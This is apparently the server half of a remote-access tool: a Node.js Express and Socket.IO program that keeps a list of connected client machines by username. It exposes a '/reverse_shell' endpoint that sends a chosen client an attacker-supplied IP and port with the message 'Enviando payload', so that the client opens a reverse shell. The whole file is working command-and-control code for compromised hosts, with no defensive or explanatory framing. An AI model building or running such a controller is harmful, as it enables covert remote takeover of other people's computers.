const express = require('express');
const app = express();
const http = require('http');
const server = http.createServer(app);
const { Server } = require("socket.io");
const io = new Server(server);

const port = process.env.PORT || 3000;

app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true, parameterLimit: 50000 }));

app.post('/usuarios_online', async (req, res) => {
  const sockets = await io.fetchSockets();
  let tempshowusers = [`Lista De Usuarios:`]
  for (const socket of sockets) {
    console.log(socket.data.username);
    tempshowusers.push(socket.data.username)
  }
  res.send(tempshowusers)
});

app.post('/reverse_shell', async (req, res) => {
  let nome = req.body.nome
  info = { porta: req.body.porta, ip: req.body.ip }
  const sockets = await io.fetchSockets();
  let nomes = []

  for (const socket of sockets) {
    nomes.push(socket.data.username)
  }

  if (nomes.includes(nome) == true) {

    for (const socket of sockets) {

      if (socket.data.username == nome) {
        res.send(`Usuario encontrado, Enviando payload`)
        socket.emit(`reverse`, info)
      }

    }

  } else {
    res.send(`Usuario Nao encontrado`)
  }

});

io.on("connection", (socket) => {
  socket.on("connection", async (arg) => {
    socket.data.username = arg;
  });
});

server.listen(port, () => {
  console.log('listening on *: 3000');
});